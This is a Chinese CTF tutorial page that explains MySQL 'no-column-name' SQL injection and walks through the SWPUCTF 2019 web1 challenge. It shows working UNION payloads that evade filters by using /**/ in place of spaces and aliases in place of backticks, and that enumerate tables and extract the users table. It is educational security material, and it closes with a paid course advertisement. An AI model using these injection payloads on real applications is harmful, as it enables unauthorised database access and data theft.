<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CTF|mysql之无列名注入</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/98206699">原文</a></p>
<div class="title-image"><img src="https://pic2.zhimg.com/v2-99614332bdd27d812826d1778a12d99b_b.jpg" alt=""></div><h2>无列名注入</h2><p><b>什么是无列名注入？</b></p><p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql =&gt; 5 的版本中存在一个名为 information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-100b196f5880c7ebc0796136ccded51e_b.jpg" data-caption="" data-size="small" data-rawwidth="801" data-rawheight="406" class="origin_image zh-lightbox-thumb" width="801" data-original="https://pic3.zhimg.com/v2-100b196f5880c7ebc0796136ccded51e_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-100b196f5880c7ebc0796136ccded51e_b.jpg" data-caption="" data-size="small" data-rawwidth="801" data-rawheight="406" class="origin_image zh-lightbox-thumb lazy" width="801" data-original="https://pic3.zhimg.com/v2-100b196f5880c7ebc0796136ccded51e_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-100b196f5880c7ebc0796136ccded51e_b.jpg"/></figure><p>当我们通过暴力破解获取到表名后，如何利用呢？</p><blockquote>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</blockquote><p><b>使用条件&amp;方法</b></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p><b>不使用表名查询</b></p><p>正常的 sql 查询如下：</p><div class="highlight"><pre><code class="language-text">select * from `admin`;</code></pre></div><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-788233f4159b478e543850614ffefb34_b.jpg" data-caption="" data-size="small" data-rawwidth="611" data-rawheight="409" class="origin_image zh-lightbox-thumb" width="611" data-original="https://pic1.zhimg.com/v2-788233f4159b478e543850614ffefb34_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-788233f4159b478e543850614ffefb34_b.jpg" data-caption="" data-size="small" data-rawwidth="611" data-rawheight="409" class="origin_image zh-lightbox-thumb lazy" width="611" data-original="https://pic1.zhimg.com/v2-788233f4159b478e543850614ffefb34_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-788233f4159b478e543850614ffefb34_b.jpg"/></figure><p>其中，列名为 id、name、password，使用 union 查询：</p><div class="highlight"><pre><code class="language-text">select 1,2,3 union select * from admin;</code></pre></div><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-65e532173552fc6d26170dd1e3715632_b.jpg" data-caption="" data-size="small" data-rawwidth="712" data-rawheight="358" class="origin_image zh-lightbox-thumb" width="712" data-original="https://pic3.zhimg.com/v2-65e532173552fc6d26170dd1e3715632_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-65e532173552fc6d26170dd1e3715632_b.jpg" data-caption="" data-size="small" data-rawwidth="712" data-rawheight="358" class="origin_image zh-lightbox-thumb lazy" width="712" data-original="https://pic3.zhimg.com/v2-65e532173552fc6d26170dd1e3715632_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-65e532173552fc6d26170dd1e3715632_b.jpg"/></figure><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><div class="highlight"><pre><code class="language-text">select `3` from (select 1,2,3 union select * from admin)a;</code></pre></div><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-9e8fcd0843cfaadeddc04fa1ced27b83_b.jpg" data-caption="" data-size="small" data-rawwidth="722" data-rawheight="376" class="origin_image zh-lightbox-thumb" width="722" data-original="https://pic4.zhimg.com/v2-9e8fcd0843cfaadeddc04fa1ced27b83_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-9e8fcd0843cfaadeddc04fa1ced27b83_b.jpg" data-caption="" data-size="small" data-rawwidth="722" data-rawheight="376" class="origin_image zh-lightbox-thumb lazy" width="722" data-original="https://pic4.zhimg.com/v2-9e8fcd0843cfaadeddc04fa1ced27b83_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-9e8fcd0843cfaadeddc04fa1ced27b83_b.jpg"/></figure><blockquote>末尾的 a 可以是任意字符，用于命名。</blockquote><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><div class="highlight"><pre><code class="language-text">select b from (select 1,2,3 as b union select * from admin)a;</code></pre></div><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-df7727a7d1261d9d1d8bbe4320e3a4e3_b.jpg" data-caption="" data-size="normal" data-rawwidth="508" data-rawheight="374" class="origin_image zh-lightbox-thumb" width="508" data-original="https://pic4.zhimg.com/v2-df7727a7d1261d9d1d8bbe4320e3a4e3_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-df7727a7d1261d9d1d8bbe4320e3a4e3_b.jpg" data-caption="" data-size="normal" data-rawwidth="508" data-rawheight="374" class="origin_image zh-lightbox-thumb lazy" width="508" data-original="https://pic4.zhimg.com/v2-df7727a7d1261d9d1d8bbe4320e3a4e3_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-df7727a7d1261d9d1d8bbe4320e3a4e3_b.jpg"/></figure><p>同时查询多个列：</p><div class="highlight"><pre><code class="language-text">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</code></pre></div><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-b0a116a61a5072bae93dce02805f1d5a_b.jpg" data-caption="" data-size="small" data-rawwidth="656" data-rawheight="248" class="origin_image zh-lightbox-thumb" width="656" data-original="https://pic3.zhimg.com/v2-b0a116a61a5072bae93dce02805f1d5a_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-b0a116a61a5072bae93dce02805f1d5a_b.jpg" data-caption="" data-size="small" data-rawwidth="656" data-rawheight="248" class="origin_image zh-lightbox-thumb lazy" width="656" data-original="https://pic3.zhimg.com/v2-b0a116a61a5072bae93dce02805f1d5a_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-b0a116a61a5072bae93dce02805f1d5a_b.jpg"/></figure><p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p><p>payload：</p><div class="highlight"><pre><code class="language-text">select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</code></pre></div><blockquote>源自：<a href="https://link.zhihu.com/?target=https%3A//blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">blog.redforce.io/sqli-e</span><span class="invisible">xtracting-data-without-knowing-columns-names/</span><span class="ellipsis"></span></a></blockquote><p>最近的 CTF 中，就要几道关于无列名注入的题目。</p><h2>SWPUCTF 2019</h2><p><b>web1-easy_web</b></p><p>进入题目发现有登陆和注册接口，直接注册登录。</p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-a043968b73747b78660e54be5813687b_b.jpg" data-caption="" data-size="small" data-rawwidth="704" data-rawheight="449" class="origin_image zh-lightbox-thumb" width="704" data-original="https://pic4.zhimg.com/v2-a043968b73747b78660e54be5813687b_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-a043968b73747b78660e54be5813687b_b.jpg" data-caption="" data-size="small" data-rawwidth="704" data-rawheight="449" class="origin_image zh-lightbox-thumb lazy" width="704" data-original="https://pic4.zhimg.com/v2-a043968b73747b78660e54be5813687b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-a043968b73747b78660e54be5813687b_b.jpg"/></figure><p>来到后台。</p><figure data-size="small"><noscript><img src="https://pic2.zhimg.com/v2-c92f3b54bea2c4fd0f872d8d0a62bde9_b.jpg" data-caption="" data-size="small" data-rawwidth="850" data-rawheight="334" class="origin_image zh-lightbox-thumb" width="850" data-original="https://pic2.zhimg.com/v2-c92f3b54bea2c4fd0f872d8d0a62bde9_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-c92f3b54bea2c4fd0f872d8d0a62bde9_b.jpg" data-caption="" data-size="small" data-rawwidth="850" data-rawheight="334" class="origin_image zh-lightbox-thumb lazy" width="850" data-original="https://pic2.zhimg.com/v2-c92f3b54bea2c4fd0f872d8d0a62bde9_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-c92f3b54bea2c4fd0f872d8d0a62bde9_b.jpg"/></figure><p>注入点在广告名。</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-efc8cb640ed07b14abe7df943d9073ea_b.png" data-caption="" data-size="normal" data-rawwidth="1457" data-rawheight="210" class="origin_image zh-lightbox-thumb" width="1457" data-original="https://pic3.zhimg.com/v2-efc8cb640ed07b14abe7df943d9073ea_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-efc8cb640ed07b14abe7df943d9073ea_b.png" data-caption="" data-size="normal" data-rawwidth="1457" data-rawheight="210" class="origin_image zh-lightbox-thumb lazy" width="1457" data-original="https://pic3.zhimg.com/v2-efc8cb640ed07b14abe7df943d9073ea_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-efc8cb640ed07b14abe7df943d9073ea_b.png"/></figure><p>点击广告详情。</p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-256985064fab50404d41f7f54a91fb77_b.jpg" data-caption="" data-size="normal" data-rawwidth="1429" data-rawheight="241" class="origin_image zh-lightbox-thumb" width="1429" data-original="https://pic4.zhimg.com/v2-256985064fab50404d41f7f54a91fb77_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-256985064fab50404d41f7f54a91fb77_b.jpg" data-caption="" data-size="normal" data-rawwidth="1429" data-rawheight="241" class="origin_image zh-lightbox-thumb lazy" width="1429" data-original="https://pic4.zhimg.com/v2-256985064fab50404d41f7f54a91fb77_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-256985064fab50404d41f7f54a91fb77_b.jpg"/></figure><p>发现数据库的报错信息，证明存在注入。</p><p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</p><p>用 sys.schema_auto_increment_columns 来注表名</p><div class="highlight"><pre><code class="language-text">111&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</code></pre></div><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-395ccc0adf983152022400eefebf2c1b_b.jpg" data-caption="" data-size="normal" data-rawwidth="1487" data-rawheight="269" class="origin_image zh-lightbox-thumb" width="1487" data-original="https://pic4.zhimg.com/v2-395ccc0adf983152022400eefebf2c1b_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-395ccc0adf983152022400eefebf2c1b_b.jpg" data-caption="" data-size="normal" data-rawwidth="1487" data-rawheight="269" class="origin_image zh-lightbox-thumb lazy" width="1487" data-original="https://pic4.zhimg.com/v2-395ccc0adf983152022400eefebf2c1b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-395ccc0adf983152022400eefebf2c1b_b.jpg"/></figure><p>表名 ads 和 users</p><p>但是不知道列名，只能用无列名注入的方式，另外还过滤了反引号`，用别名aaa来代替，payload：</p><div class="highlight"><pre><code class="language-text">111&#39;/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</code></pre></div><figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-40e63eaeaef1d8812a6281fc80b742bd_b.jpg" data-caption="" data-size="normal" data-rawwidth="1495" data-rawheight="254" class="origin_image zh-lightbox-thumb" width="1495" data-original="https://pic2.zhimg.com/v2-40e63eaeaef1d8812a6281fc80b742bd_r.jpg"/></noscript><img src="https://pic2.zhimg.com/v2-40e63eaeaef1d8812a6281fc80b742bd_b.jpg" data-caption="" data-size="normal" data-rawwidth="1495" data-rawheight="254" class="origin_image zh-lightbox-thumb lazy" width="1495" data-original="https://pic2.zhimg.com/v2-40e63eaeaef1d8812a6281fc80b742bd_r.jpg" data-actualsrc="https://pic2.zhimg.com/v2-40e63eaeaef1d8812a6281fc80b742bd_b.jpg"/></figure><p>第二列内容为 flag，那么看看第三列。</p><div class="highlight"><pre><code class="language-text">111&#39;/**/union/**/select/**/1,(select/**/bbb/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</code></pre></div><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-cf3ef41d649ec41a36d47ea57eca9752_b.png" data-caption="" data-size="normal" data-rawwidth="1464" data-rawheight="226" class="origin_image zh-lightbox-thumb" width="1464" data-original="https://pic3.zhimg.com/v2-cf3ef41d649ec41a36d47ea57eca9752_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-cf3ef41d649ec41a36d47ea57eca9752_b.png" data-caption="" data-size="normal" data-rawwidth="1464" data-rawheight="226" class="origin_image zh-lightbox-thumb lazy" width="1464" data-original="https://pic3.zhimg.com/v2-cf3ef41d649ec41a36d47ea57eca9752_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-cf3ef41d649ec41a36d47ea57eca9752_b.png"/></figure><p>得到一串 md5，得到 flag。</p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-e55018101943c715520e26bbbc738d87_b.jpg" data-caption="" data-size="small" data-rawwidth="956" data-rawheight="476" class="origin_image zh-lightbox-thumb" width="956" data-original="https://pic4.zhimg.com/v2-e55018101943c715520e26bbbc738d87_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-e55018101943c715520e26bbbc738d87_b.jpg" data-caption="" data-size="small" data-rawwidth="956" data-rawheight="476" class="origin_image zh-lightbox-thumb lazy" width="956" data-original="https://pic4.zhimg.com/v2-e55018101943c715520e26bbbc738d87_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-e55018101943c715520e26bbbc738d87_b.jpg"/></figure><p>想了解更多关于 CTF 的知识技巧，欢迎关注 <a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn/" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全学院</a> 。</p><p>可能有小白看不懂 CTF，什么是 CTF？什么是 sql 注入？什么是 payload 等等。。。</p><p><a href="https://link.zhihu.com/?target=https%3A//twosecurity.cn/" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全学院</a> 最近推出了网络安全零基础入门集训，哪怕你什么都不懂，都能让你轻松（好吧，没那么简单，还是要付出努力的）入门网络安全。</p><a href="https://zhuanlan.zhihu.com/p/97763889" data-draft-node="block" data-draft-type="link-card" data-image="https://pic4.zhimg.com/v2-685d1b251edaac139b1ca1a08811e317_180x120.jpg" data-image-width="900" data-image-height="383" class="internal">二向箔安全学院：入门网络安全的统一解答【零基础入门集训营】</a><p>进行网络安全入门集训，短短 <b>2 个周 </b>快速入门 CTF。</p><p>当然，态度认真的学员（说白了就是都可以）可免费使用我们官方的 <b>在线强化训练集</b> （现含81道 CTF 题，随时更新ing）</p><figure data-size="small"><noscript><img src="https://pic3.zhimg.com/v2-6ac23bc399dfcf8529d153b35eadbb12_b.jpg" data-caption="" data-size="small" data-rawwidth="2149" data-rawheight="1217" class="origin_image zh-lightbox-thumb" width="2149" data-original="https://pic3.zhimg.com/v2-6ac23bc399dfcf8529d153b35eadbb12_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-6ac23bc399dfcf8529d153b35eadbb12_b.jpg" data-caption="" data-size="small" data-rawwidth="2149" data-rawheight="1217" class="origin_image zh-lightbox-thumb lazy" width="2149" data-original="https://pic3.zhimg.com/v2-6ac23bc399dfcf8529d153b35eadbb12_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-6ac23bc399dfcf8529d153b35eadbb12_b.jpg"/></figure><p>本期 <b>限定两个班级</b>，招满即止。</p><p><a href="https://link.zhihu.com/?target=https%3A//submit.twosecurity.io/f/lF6ZMY" class=" wrap external" target="_blank" rel="nofollow noreferrer">填写资料并付款</a>，按付款时间顺序开班，<b>因人数超过限制而报名失败的学员将全额退款。</b></p><p>详情可咨询客服微信 <b>twosecurity02</b></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
